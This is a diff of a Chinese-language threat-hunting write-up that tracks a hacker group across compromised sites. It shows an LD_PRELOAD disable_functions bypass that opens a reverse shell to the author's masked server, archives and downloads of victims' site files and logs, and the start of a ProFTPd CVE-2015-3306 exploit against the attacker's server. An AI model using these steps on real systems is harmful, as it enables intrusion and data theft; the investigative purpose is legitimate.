+</code></pre>
+<p><a href="https://camo.githubusercontent.com/c745fab220976e1a2be673b1a1e15b9f5a8b3bca/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f31326a6e6e356b6d646c3531656939693569757375636a752f6d69726f6861766961722e736b2d636f6e6669672e7068702d7368656c6c2e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/c745fab220976e1a2be673b1a1e15b9f5a8b3bca/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f31326a6e6e356b6d646c3531656939693569757375636a752f6d69726f6861766961722e736b2d636f6e6669672e7068702d7368656c6c2e706e67" alt="mirohaviar.sk-config.php-shell.png-13.4kB" />
+</a></p>
 <hr>
 <h3 id="43-提权"><strong>4.3 提权</strong></h3>
-<p>通过webshell得到了具体系统信息，下一步尝试提权，目的是获得Apache的web访问日志。 <img src="https://camo.githubusercontent.com/5bc2f556801c428b1be596b3b3285a117c896c69/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f77686d746e6e62657967767372676b327065653765747a692f6d69722d737973696e666f2e706e67" alt="mir-sysinfo.png-118.7kB"></p>
+<p>通过webshell得到了具体系统信息，下一步尝试提权，目的是获得Apache的web访问日志。 <a href="https://camo.githubusercontent.com/5bc2f556801c428b1be596b3b3285a117c896c69/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f77686d746e6e62657967767372676b327065653765747a692f6d69722d737973696e666f2e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/5bc2f556801c428b1be596b3b3285a117c896c69/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f77686d746e6e62657967767372676b327065653765747a692f6d69722d737973696e666f2e706e67" alt="mir-sysinfo.png-118.7kB" />
+</a></p>
 <h4 id="431-突破disable_functions"><strong>4.3.1 突破disable_functions</strong></h4>
 <p>测试发现目标限制跨目录（open_basedir），并禁用了命令执行函数，导致WebShell权限下，无法跨目录访问也无法执行命令。</p>
 <pre><code>disable_functions：	 escapeshellarg,escapeshellcmd,exec,passthru,proc_close,proc_get_status,proc_nice,proc_open,proc_terminate,shell_exec,system,popen,pcntl_exec	
 
 open_basedir：	/storage/www/mirohaviar.sk/:/storage/www-include/:/usr/share/php5/:/usr/share/file/:/usr/share/pear/:/tmp/
-</code></pre><p><img src="https://camo.githubusercontent.com/077ec2e3512180e66c59f6eb86f2a047afa196e5/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f7a6e3779656c65317a3579356c66727071717a6e696163762f6d69722d64697361626c655f66756e6374696f6e732e706e67" alt="mir-disable_functions.png-60.7kB"></p>
+</code></pre>
+<p><a href="https://camo.githubusercontent.com/077ec2e3512180e66c59f6eb86f2a047afa196e5/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f7a6e3779656c65317a3579356c66727071717a6e696163762f6d69722d64697361626c655f66756e6374696f6e732e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/077ec2e3512180e66c59f6eb86f2a047afa196e5/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f7a6e3779656c65317a3579356c66727071717a6e696163762f6d69722d64697361626c655f66756e6374696f6e732e706e67" alt="mir-disable_functions.png-60.7kB" />
+</a></p>
 <blockquote>
 <p>突破的手段很多，这里我利用LD_PRELOAD动态链接来劫持php的mail函数突破disable_functions执行系统命令。</p>
 </blockquote>
@@ -518,7 +572,8 @@ Symbol table '.dynsym' contains 420 entries:
 
      76: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getuid@GLIBC_2.2.5 (3)
      77: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND send@GLIBC_2.2.5 (3)
-</code></pre><p>从中选取geteuid函数进行测试，编写动态链接程序bypass.c</p>
+</code></pre>
+<p>从中选取geteuid函数进行测试，编写动态链接程序bypass.c</p>
 <pre><code>#include&lt;stdlib.h&gt;
 #include &lt;stdio.h&gt;    
 #include&lt;string.h&gt; 
@@ -530,24 +585,32 @@ if(getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }
 unsetenv(&quot;LD_PRELOAD&quot;);
 payload();
 }
-</code></pre><p>当这个共享库中的geteuid被调用时，尝试加载payload()函数，执行命令调用system执行一个反弹shell的操作（xxx.xxx.xxx.xxx即是我的公网服务器IP）</p>
+</code></pre>
+<p>当这个共享库中的geteuid被调用时，尝试加载payload()函数，执行命令调用system执行一个反弹shell的操作（xxx.xxx.xxx.xxx即是我的公网服务器IP）</p>
 <p><strong>编译</strong></p>
 <pre><code>gcc -c -fPIC bypass.c -o bypass
 gcc -shared bypass.c -o bypass.so
-</code></pre><p><strong>上传</strong></p>
+</code></pre>
+<p><strong>上传</strong></p>
 <pre><code>www-data@m7web1:/tmp$ cat b64.txt|base64 -d &gt;bypass.so
 www-data@m7web1:/tmp$ file bypass.so
 file bypass.so
 bypass.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV)
-</code></pre><p><strong>执行</strong></p>
+</code></pre>
+<p><strong>执行</strong></p>
 <p>bypass.php</p>
 <pre><code>&lt;?php
 putenv(&quot;LD_PRELOAD=/tmp/bypass.so&quot;);
 mail(&quot;test@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
 ?&gt;
-</code></pre><p>浏览器访问<code>http://www.mirohaviar.sk/bypass.php</code>页面后成功执行命令，得到了一个www-user权限的反弹shell。 <img src="https://camo.githubusercontent.com/24f7d365ddf74f60c1587db65f8379591652cfb1/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f626d64776a356f356b3666697a7536746f6f74393035626c2f6d69722d6e632e706e67" alt="mir-nc.png-57.1kB"></p>
+</code></pre>
+<p>浏览器访问<code>http://www.mirohaviar.sk/bypass.php</code>页面后成功执行命令，得到了一个www-user权限的反弹shell。 <a href="https://camo.githubusercontent.com/24f7d365ddf74f60c1587db65f8379591652cfb1/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f626d64776a356f356b3666697a7536746f6f74393035626c2f6d69722d6e632e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/24f7d365ddf74f60c1587db65f8379591652cfb1/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f626d64776a356f356b3666697a7536746f6f74393035626c2f6d69722d6e632e706e67" alt="mir-nc.png-57.1kB" />
+</a></p>
 <h4 id="432-发现行踪"><strong>4.3.2 发现行踪</strong></h4>
-<p>仔细看这是一家斯洛伐克的网络公司，这台服务器上面托管了五百多个网站，当前的权限可以访问这些网站的文件和数据库，令人遗憾的的是apache日志目录<code>/var/log/apache2/</code>无权限访问。 <img src="https://camo.githubusercontent.com/1cd834841a3b7268ec4468bba923e042ec1e1b48/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f386e32626a6c6f7473706a34626f6f346a6e6c65787666312f6d69722d736974652e706e67" alt="mir-site.png-112.8kB"></p>
+<p>仔细看这是一家斯洛伐克的网络公司，这台服务器上面托管了五百多个网站，当前的权限可以访问这些网站的文件和数据库，令人遗憾的的是apache日志目录<code>/var/log/apache2/</code>无权限访问。 <a href="https://camo.githubusercontent.com/1cd834841a3b7268ec4468bba923e042ec1e1b48/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f386e32626a6c6f7473706a34626f6f346a6e6c65787666312f6d69722d736974652e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/1cd834841a3b7268ec4468bba923e042ec1e1b48/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f386e32626a6c6f7473706a34626f6f346a6e6c65787666312f6d69722d736974652e706e67" alt="mir-site.png-112.8kB" />
+</a></p>
 <p>不过我在<code>/tmp</code>目录下面发现了一个有趣的日志文件。</p>
 <pre><code>[/tmp/]$cat w
 --2018-11-26 04:49:06--  http://187.85.134.4/cacat/mm.tgz
@@ -574,8 +637,27 @@ Saving to: 'mm.tgz'
    750K .                                                     100% 2438G=1.3s
 
 2018-11-26 04:49:10 (577 KB/s) - 'mm.tgz' saved [769309/769309]
-</code></pre><h3 id="44-追踪"><strong>4.4 追踪</strong></h3>
-<p>根据泄露日志，使用谷歌搜索关键字：<code>http://187.85.134.4</code>，发现了一个历史页面。 <img src="https://camo.githubusercontent.com/72b4508c7fb8c65f258f07ce9a428c40a5ea65de/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c6d696b76316d667362657a6e62777067713073323969752f323031392d30312d323125323031382d31392d34322545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2019-01-21 18-19-42屏幕截图.png-106.2kB"> <img src="https://camo.githubusercontent.com/2a0d252f4361b988ca86d10d1575cc786fdc62df/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f38737969306439747538746731776a7862753062653171772f323031392d30312d323125323031382d32392d33312545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2019-01-21 18-29-31屏幕截图.png-34.3kB"> 这是一个已经被删除的后门页面，刚好被谷歌爬虫收录了，进一步搜索一下这个后门参数的关键字： <code>inurl:bc.php?filesrc=</code>，得到了多条后门记录。 <img src="https://camo.githubusercontent.com/5b799f7da5fafc101b822c10bd4d320bc97a82de/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f33706f6f766a6264673330787174736833733576656b30342f323031392d30312d323125323031382d33332d34362545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2019-01-21 18-33-46屏幕截图.png-197.6kB"> 其中多个WebShell缓存页面内容跟上一个被黑网站的临时目录中发现的日志内容吻合，疑似自动化攻击留下的日志，WebShell底部署名：<code>Muslim Cyber Corp - Mujahidin Cyber Army - Family Attack Cyber</code> ，表明后门均为这个黑客组织所有。 <img src="https://camo.githubusercontent.com/ba131e74e2eb1dd8102e27fd54c721b9eba1aa95/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f36793665327a62786d7966736f6761336633786a376968702f323031382d31322d303325323031302d30312d34362545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-03 10-01-46屏幕截图.png-194kB"> <strong>进一步搜索这个黑客组织名称，发现大量被黑网站，程序使用Wordpress与Joomla居多。</strong> <img src="https://camo.githubusercontent.com/cdaaaa800b84946e1ed5897fa5894af88b9b9e0a/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f74757a366d657375317334656669643969616c7a623339692f413131312e706e67" alt="A111.png-160.3kB"> <img src="https://camo.githubusercontent.com/22876d176eab9819d588f5239e14a8164fd8c017/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c756978346169646d327374693270396964746863756d302f4132322e706e67" alt="A22.png-9.2kB"> <img src="https://camo.githubusercontent.com/855aa4affebde7940b8e2c728eb46d5c3fbf72e8/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3266676b7230696f376d34786d6d6e3837333973346b6d372f4133332e706e67" alt="A33.png-88.2kB"> <img src="https://camo.githubusercontent.com/e542c31a4aaa670730efe19aaa132bee9cba6484/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f76306d377a6f38693469636f367466767a347332696371342f4134342e706e67" alt="A44.png-62.1kB"> <img src="https://camo.githubusercontent.com/51c74ea1ef1b9b77c1ab1e5809ed88b1d84946d4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f7279726b6f7931696239303473637a6e37346376396f75742f4135352e706e67" alt="A55.png-56.5kB"></p>
+</code></pre>
+<h3 id="44-追踪"><strong>4.4 追踪</strong></h3>
+<p>根据泄露日志，使用谷歌搜索关键字：<code>http://187.85.134.4</code>，发现了一个历史页面。 <a href="https://camo.githubusercontent.com/72b4508c7fb8c65f258f07ce9a428c40a5ea65de/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c6d696b76316d667362657a6e62777067713073323969752f323031392d30312d323125323031382d31392d34322545352542312538462545352542392539352545362538382541412545352539422542452e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/72b4508c7fb8c65f258f07ce9a428c40a5ea65de/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c6d696b76316d667362657a6e62777067713073323969752f323031392d30312d323125323031382d31392d34322545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2019-01-21 18-19-42屏幕截图.png-106.2kB" />
+</a> <a href="https://camo.githubusercontent.com/2a0d252f4361b988ca86d10d1575cc786fdc62df/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f38737969306439747538746731776a7862753062653171772f323031392d30312d323125323031382d32392d33312545352542312538462545352542392539352545362538382541412545352539422542452e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/2a0d252f4361b988ca86d10d1575cc786fdc62df/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f38737969306439747538746731776a7862753062653171772f323031392d30312d323125323031382d32392d33312545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2019-01-21 18-29-31屏幕截图.png-34.3kB" />
+</a> 这是一个已经被删除的后门页面，刚好被谷歌爬虫收录了，进一步搜索一下这个后门参数的关键字： <code>inurl:bc.php?filesrc=</code>，得到了多条后门记录。 <a href="https://camo.githubusercontent.com/5b799f7da5fafc101b822c10bd4d320bc97a82de/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f33706f6f766a6264673330787174736833733576656b30342f323031392d30312d323125323031382d33332d34362545352542312538462545352542392539352545362538382541412545352539422542452e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/5b799f7da5fafc101b822c10bd4d320bc97a82de/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f33706f6f766a6264673330787174736833733576656b30342f323031392d30312d323125323031382d33332d34362545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2019-01-21 18-33-46屏幕截图.png-197.6kB" />
+</a> 其中多个WebShell缓存页面内容跟上一个被黑网站的临时目录中发现的日志内容吻合，疑似自动化攻击留下的日志，WebShell底部署名：<code>Muslim Cyber Corp - Mujahidin Cyber Army - Family Attack Cyber</code> ，表明后门均为这个黑客组织所有。 <a href="https://camo.githubusercontent.com/ba131e74e2eb1dd8102e27fd54c721b9eba1aa95/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f36793665327a62786d7966736f6761336633786a376968702f323031382d31322d303325323031302d30312d34362545352542312538462545352542392539352545362538382541412545352539422542452e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/ba131e74e2eb1dd8102e27fd54c721b9eba1aa95/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f36793665327a62786d7966736f6761336633786a376968702f323031382d31322d303325323031302d30312d34362545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-03 10-01-46屏幕截图.png-194kB" />
+</a> <strong>进一步搜索这个黑客组织名称，发现大量被黑网站，程序使用Wordpress与Joomla居多。</strong> <a href="https://camo.githubusercontent.com/cdaaaa800b84946e1ed5897fa5894af88b9b9e0a/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f74757a366d657375317334656669643969616c7a623339692f413131312e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/cdaaaa800b84946e1ed5897fa5894af88b9b9e0a/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f74757a366d657375317334656669643969616c7a623339692f413131312e706e67" alt="A111.png-160.3kB" />
+</a> <a href="https://camo.githubusercontent.com/22876d176eab9819d588f5239e14a8164fd8c017/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c756978346169646d327374693270396964746863756d302f4132322e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/22876d176eab9819d588f5239e14a8164fd8c017/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c756978346169646d327374693270396964746863756d302f4132322e706e67" alt="A22.png-9.2kB" />
+</a> <a href="https://camo.githubusercontent.com/855aa4affebde7940b8e2c728eb46d5c3fbf72e8/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3266676b7230696f376d34786d6d6e3837333973346b6d372f4133332e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/855aa4affebde7940b8e2c728eb46d5c3fbf72e8/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3266676b7230696f376d34786d6d6e3837333973346b6d372f4133332e706e67" alt="A33.png-88.2kB" />
+</a> <a href="https://camo.githubusercontent.com/e542c31a4aaa670730efe19aaa132bee9cba6484/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f76306d377a6f38693469636f367466767a347332696371342f4134342e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/e542c31a4aaa670730efe19aaa132bee9cba6484/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f76306d377a6f38693469636f367466767a347332696371342f4134342e706e67" alt="A44.png-62.1kB" />
+</a> <a href="https://camo.githubusercontent.com/51c74ea1ef1b9b77c1ab1e5809ed88b1d84946d4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f7279726b6f7931696239303473637a6e37346376396f75742f4135352e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/51c74ea1ef1b9b77c1ab1e5809ed88b1d84946d4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f7279726b6f7931696239303473637a6e37346376396f75742f4135352e706e67" alt="A55.png-56.5kB" />
+</a></p>
 <hr>
 <h3 id="45-提取日志"><strong>4.5 提取日志</strong></h3>
 <p>我提取了其中几个被入侵网站的访问日志。</p>
@@ -585,10 +667,12 @@ Saving to: 'mm.tgz'
 --exclude=/home/radiolanalhue/public_html/www.radiolanalhue.cl.tar.gz  /home/radiolanalhue/public_html/  
 
 tar zcvf /home/radiolanalhue/public_html/www.radiolanalhue.cl.log.tar.gz /home/radiolanalhue/logs/radiolanalhue.cl-ssl_log-Nov-2018.gz /home/radiolanalhue/access-logs/ /home/radiolanalhue/access-logs/radiolanalhue.cl  
-</code></pre><p>下载</p>
+</code></pre>
+<p>下载</p>
 <pre><code>wget -c http://www.radiolanalhue.cl/www.radiolanalhue.cl.tar.gz 
 wget -c http://www.radiolanalhue.cl/www.radiolanalhue.cl.log.tar.gz
-</code></pre><p>分析</p>
+</code></pre>
+<p>分析</p>
 <pre><code>根据后门文件名，匹配Apache访问日志，到攻击者代理IP和User Agent。
 
 
@@ -605,12 +689,14 @@ wget -c http://www.radiolanalhue.cl/www.radiolanalhue.cl.log.tar.gz
 66.249.66.151 - - [01/Dec/2018:06:34:34 -0300] &quot;GET /online/templates/beez5/bc.php?filesrc=/home/radiolanalhue/public_html/online/templates/beez5/favicon.ico&amp;path=/home/radiolanalhue/public_html/online/templates/beez5 HTTP/1.1&quot; 200 2348 &quot;-&quot; &quot;Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot;
 
 66.249.66.153 - - [01/Dec/2018:06:51:46 -0300] &quot;GET /online/templates/beez5/bc.php?filesrc=/home/radiolanalhue/public_html/online/templates/beez5/component.php&amp;path=/home/radiolanalhue/public_html/online/templates/beez5 HTTP/1.1&quot; 200 5456 &quot;-&quot; &quot;Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot;
-</code></pre><hr>
+</code></pre>
+<hr>
 <h4 id="452-网站zebramediaal"><strong>4.5.2 网站：zebramedia.al</strong></h4>
 <p>打包</p>
 <pre><code>tar zcvf /home/vayqpdvg/zebramedia.al/zebramedia.al-www.tar.gz --exclude=/home/vayqpdvg/zebramedia.al/zebramedia.al-www.tar.gz /home/vayqpdvg/zebramedia.al/
 tar zcvf /home/vayqpdvg/zebramedia.al/zebramedia.al-log.tar.gz /home/vayqpdvg/logs
-</code></pre><p>下载</p>
+</code></pre>
+<p>下载</p>
 <pre><code>wget  http://zebramedia.al/zebramedia.al-log.tar.gz
 wget  http://zebramedia.al/zebramedia.al-www.tar.gz
 
@@ -631,7 +717,8 @@ wget  http://zebramedia.al/zebramedia.al-www.tar.gz
 -rw-r--r-- 1 1365 1328   139759 11月 30 21:15 zebramedia.publik.live-ssl_log-Nov-2018.gz
 -rw-r--r-- 1 1365 1328  6047261 11月 30 21:15 zeri-popullit.publik.live-Nov-2018.gz
 -rw-r--r-- 1 1365 1328    52004 11月 30 21:15 zeri-popullit.publik.live-ssl_log-Nov-2018.gz
-</code></pre><p>分析</p>
+</code></pre>
+<p>分析</p>
 <pre><code>根据后门文件名，匹配Apache访问日志，到攻击者代理IP和User Agent。
 
  ⚡ root@kali  /tmp/zebramedia.al/log/home/vayqpdvg/logs  grep &quot;INSTALL.sql.txt.php&quot; * |grep &quot;php&quot; | awk -F &quot;:&quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]&quot; &quot;i;}}' |sort |uniq
@@ -645,7 +732,8 @@ wget  http://zebramedia.al/zebramedia.al-www.tar.gz
 178.128.221.199 - - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&quot;
 
 197.211.61.82 - - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;
-</code></pre><hr>
+</code></pre>
+<hr>
 <h4 id="452-网站helioncompositescom"><strong>4.5.2 网站：helioncomposites.com</strong></h4>
 <p>打包</p>
 <pre><code>日志路径:
@@ -662,10 +750,12 @@ helioncomposites.com-ssl_log-Nov-2018.gz
 tar zcvf /home2/helionco/www/helioncomposites.com-www.tar.gz --exclude=/home2/helionco/www/helioncomposites.com-www.tar.gz  /home2/helionco/www/
 
 tar zcvf /home2/helionco/www/helioncomposites.com-log.tar.gz /home2/helionco/logs/ /home2/helionco/access-logs/helioncomposites.com/
-</code></pre><p>下载</p>
+</code></pre>
+<p>下载</p>
 <pre><code>wget  http://helioncomposites.com/helioncomposites.com-log.tar.gz
 wget  http://helioncomposites.com/helioncomposites.com-www.tar.gz
-</code></pre><p>分析</p>
+</code></pre>
+<p>分析</p>
 <pre><code>根据后门文件名，匹配Apache访问日志，到攻击者代理IP和User Agent。
 
  ⚡ root@kali  /tmp  grep &quot;.php&quot; * |grep &quot;/home2/helionco/public_html/&quot; |grep  &quot;HTTP\/1.1\&quot; 200&quot; |awk -F &quot;:&quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]&quot; &quot;i;}}' |sort -t &quot; &quot; -k 1 -n -r &gt;ip.txt
@@ -694,13 +784,18 @@ IP: 198.143.57.73 来自: 美国 Incapsula
 IP: 198.143.57.5 来自: 美国 Incapsula
 IP: 198.143.32.10 来自: 美国 Incapsula
 ......
-</code></pre><blockquote>
+</code></pre>
+<blockquote>
 <p>这个网站由于日志不全，提取出的IP大都是爬虫IP，所以不纳入最终的汇总。</p>
 </blockquote>
 <hr>
 <h4 id="453-发现钓鱼程序"><strong>4.5.3 发现钓鱼程序</strong></h4>
 <p>网站　<code>zebramedia.al</code>　上发现多个攻击者放置的钓鱼程序和模板。</p>
-<p><strong>针对Dropbox</strong> <img src="https://camo.githubusercontent.com/b2802f35b646236deec64910ac3b822d4cbc6fdd/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c3335797435306571326a347639673376696c64353836682f323031382d31322d303125323030302d33322d30332545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-01 00-32-03屏幕截图.png-116.9kB"> <strong>针对Gmail</strong> <img src="https://camo.githubusercontent.com/6e9909855f693fd4d73f35935f55f6fc925bf255/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f62326c6b7974386378656468726c327a37316e31336b646f2f323031382d31322d303125323030302d32382d35312545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-01 00-28-51屏幕截图.png-76.2kB"></p>
+<p><strong>针对Dropbox</strong> <a href="https://camo.githubusercontent.com/b2802f35b646236deec64910ac3b822d4cbc6fdd/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c3335797435306571326a347639673376696c64353836682f323031382d31322d303125323030302d33322d30332545352542312538462545352542392539352545362538382541412545352539422542452e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/b2802f35b646236deec64910ac3b822d4cbc6fdd/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c3335797435306571326a347639673376696c64353836682f323031382d31322d303125323030302d33322d30332545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-01 00-32-03屏幕截图.png-116.9kB" />
+</a> <strong>针对Gmail</strong> <a href="https://camo.githubusercontent.com/6e9909855f693fd4d73f35935f55f6fc925bf255/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f62326c6b7974386378656468726c327a37316e31336b646f2f323031382d31322d303125323030302d32382d35312545352542312538462545352542392539352545362538382541412545352539422542452e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/6e9909855f693fd4d73f35935f55f6fc925bf255/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f62326c6b7974386378656468726c327a37316e31336b646f2f323031382d31322d303125323030302d32382d35312545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-01 00-28-51屏幕截图.png-76.2kB" />
+</a></p>
 <hr>
 <h3 id="46-关联分析"><strong>4.6 关联分析</strong></h3>
 <p>使用之前得到的后门文件中的关键字（<code>config.php</code>）对这3个网站文件进行匹配，发现其中2个存在相同后门文件，并且文件MD5值相同。</p>
@@ -710,14 +805,16 @@ IP: 198.143.32.10 来自: 美国 Incapsula
 ./mirohaviar.sk/www/config.php
 ./zebramedia.al/www/zebramedia.al/config.php
 ./www.radiolanalhue.cl/www/public_html/online/administrator/templates/bluestork/config.php
-</code></pre><p>后门文件MD5</p>
+</code></pre>
+<p>后门文件MD5</p>
 <pre><code> ⚡ root@kali  /tmp  find . -name &quot;*.php&quot; |xargs grep  &quot;\$bm_____s&quot; |awk -F &quot;:&quot; '{print $1}' |xargs md5sum
  
 e5c06f1f66781ba5c39d909096c4cd47  ./rosturplast.com/www/rosturplast.com/shells/config.php
 e5c06f1f66781ba5c39d909096c4cd47  ./mirohaviar.sk/www/config.php
 e5c06f1f66781ba5c39d909096c4cd47  ./zebramedia.al/www/zebramedia.al/config.php
 e5c06f1f66781ba5c39d909096c4cd47  ./www.radiolanalhue.cl/www/public_html/online/administrator/templates/bluestork/config.php
-</code></pre><hr>
+</code></pre>
+<hr>
 <h2 id="五渗透攻击者傀儡服务器">五、渗透攻击者傀儡服务器</h2>
 <h3 id="51-漏洞扫描"><strong>5.1 漏洞扫描</strong></h3>
 <p><strong>目标：187.85.134.4</strong></p>
@@ -725,28 +822,63 @@ e5c06f1f66781ba5c39d909096c4cd47  ./www.radiolanalhue.cl/www/public_html/online/
 <p>[+] HOST: 187.85.134.4（巴西） [+] OS: Ubuntu [+] Web Server: Apache/2.2.22 / PHP/5.3.10-1ubuntu3.19 [+] CMS: 未知</p>
 </blockquote>
 <pre><code>nmap --script=firewalk --traceroute 187.85.134.4
-</code></pre><p><img src="https://camo.githubusercontent.com/cfe2ab2646f73e2d3367878c516656466b1e9a93/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f367262357271366a61736135346c7864616877746e3766352f3138372e38352e3133342e342d6e6d61702e706e67" alt="187.85.134.4-nmap.png-172.2kB"></p>
+</code></pre>
+<p><a href="https://camo.githubusercontent.com/cfe2ab2646f73e2d3367878c516656466b1e9a93/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f367262357271366a61736135346c7864616877746e3766352f3138372e38352e3133342e342d6e6d61702e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/cfe2ab2646f73e2d3367878c516656466b1e9a93/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f367262357271366a61736135346c7864616877746e3766352f3138372e38352e3133342e342d6e6d61702e706e67" alt="187.85.134.4-nmap.png-172.2kB" />
+</a></p>
 <h3 id="5２-漏洞利用"><strong>5.２ 漏洞利用</strong></h3>
 <p>端口扫描发现目标 FTP Server为<code>ProFTPd 1.3.4a</code>，这个版本和<code>1.3.5</code>存在未授权文件复制漏洞，我们可以通过这个漏洞往Web目录写入一个WebShell。</p>
 <pre><code>ProFTPd 1.3.5 Remote Command Execution（CVE-2015-3306） 
 ProFTPD中使用的mod_copy模块存在未授权访问风险，导致ProFTPD自带的命令 SITE CPFR 和 SITE CPTO可在未登录ftp的情况被外部黑客所利用，对系统文件进行任意复制。
-</code></pre><p><img src="https://camo.githubusercontent.com/e9c06b257b04ae1abb6e772fd260bebb371cd003/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6e7574716a6f6b636a32306a33773835306e6732736331612f50726f46545064253230312e332e352d612e706e67" alt="ProFTPd 1.3.5-a.png-84.8kB"></p>
+</code></pre>
+<p><a href="https://camo.githubusercontent.com/e9c06b257b04ae1abb6e772fd260bebb371cd003/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6e7574716a6f6b636a32306a33773835306e6732736331612f50726f46545064253230312e332e352d612e706e67" target="_blank">
